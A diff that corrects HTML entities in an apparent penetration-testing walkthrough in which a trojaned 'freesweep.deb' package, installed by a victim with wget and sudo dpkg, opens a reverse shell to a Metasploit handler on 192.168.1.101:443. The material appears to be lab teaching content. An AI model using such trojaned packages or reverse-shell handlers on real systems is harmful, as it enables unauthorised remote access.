@@ -161,9 +161,9 @@ root@kali:/tmp/evil# cp freesweep.deb /var/www/
 
 ```bash
 root@kali:~# msfconsole -q -x "use exploit/multi/handler;set PAYLOAD linux/x86/shell/reverse_tcp; set LHOST 192.168.1.101; set LPORT 443; run; exit -y"
-PAYLOAD **=&gt;** linux/x86/shell/reverse_tcp
-LHOST **=&gt;** 192.168.1.101
-LPORT **=&gt;** 443
+PAYLOAD **=>** linux/x86/shell/reverse_tcp
+LHOST **=>** 192.168.1.101
+LPORT **=>** 443
 **[*********]** Started reverse handler on 192.168.1.101:443
 **[*********]** Starting the payload handler...
 ```
@@ -182,7 +182,7 @@ ubuntu@ubuntu:~$ wget <a href="http://192.168.1.101/freesweep.deb">http://192.16
 ubuntu@ubuntu:~$ sudo dpkg -i freesweep.deb
 
 **[*********]** Sending stage **(**36 bytes**)**
-**[*********]** Command shell session 1 opened **(**192.168.1.101:443 -&gt; 192.168.1.175:1129**)**
+**[*********]** Command shell session 1 opened **(**192.168.1.101:443 -> 192.168.1.175:1129**)**
 
 ifconfig
 eth1 Link encap:Ethernet HWaddr 00:0C:29:C2:E7:E6
